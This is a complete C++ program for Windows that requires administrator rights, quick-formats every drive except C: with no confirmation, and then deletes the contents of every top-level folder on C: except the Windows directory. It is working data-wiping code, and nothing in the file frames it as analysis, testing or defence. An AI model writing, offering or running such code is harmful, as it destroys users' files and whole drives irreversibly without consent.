#include <iostream>
#include <vector>
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <string>

namespace fs = std::filesystem;

std::vector<std::string> getDriveLetters() {
    std::vector<std::string> driveLetters;
    char drive = 'A';
    DWORD drives = GetLogicalDrives();
    while (drives) {
        if (drives & 1) {
            std::string driveLetter = std::string(1, drive) + ":\\";
            driveLetters.push_back(driveLetter);
        }
        drives >>= 1;
        drive++;
    }
    return driveLetters;
}

void formatDrive(const std::string& driveLetter) {
    std::string command = "format " + driveLetter + " /FS:NTFS /Q /Y";
    system(command.c_str());
}

void deleteAllFilesAndDirectories(const std::string& path) {
    for (const auto& entry : fs::directory_iterator(path)) {
        try {
            if (fs::is_directory(entry.path())) {
                fs::remove_all(entry.path());
            } else {
                fs::remove(entry.path());
            }
        } catch (fs::filesystem_error& e) {
            std::cerr << "Error deleting: " << entry.path().string() << " - " << e.what() << std::endl;
        }
    }
}

bool isWindowsDirectory(const std::string& path) {
    char windowsPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, 0, windowsPath);
    return path == std::string(windowsPath);
}

void cleanDriveC() {
    for (const auto& entry : fs::directory_iterator("C:\\")) {
        std::string path = entry.path().string();
        if (!isWindowsDirectory(path)) {
            deleteAllFilesAndDirectories(path);
        }
    }
}

int main() {
    if (!IsUserAnAdmin()) {
        std::cerr << "This program requires administrative privileges." << std::endl;
        return 1;
    }

    std::vector<std::string> drives = getDriveLetters();

    for (const std::string& drive : drives) {
        if (drive[0] != 'C') { // Skip the system drive (usually C:)
            formatDrive(drive);
        }
    }

    cleanDriveC();

    std::cout << "All drives have been formatted except the system drive. Non-system files on C: have been deleted." << std::endl;
    return 0;
}
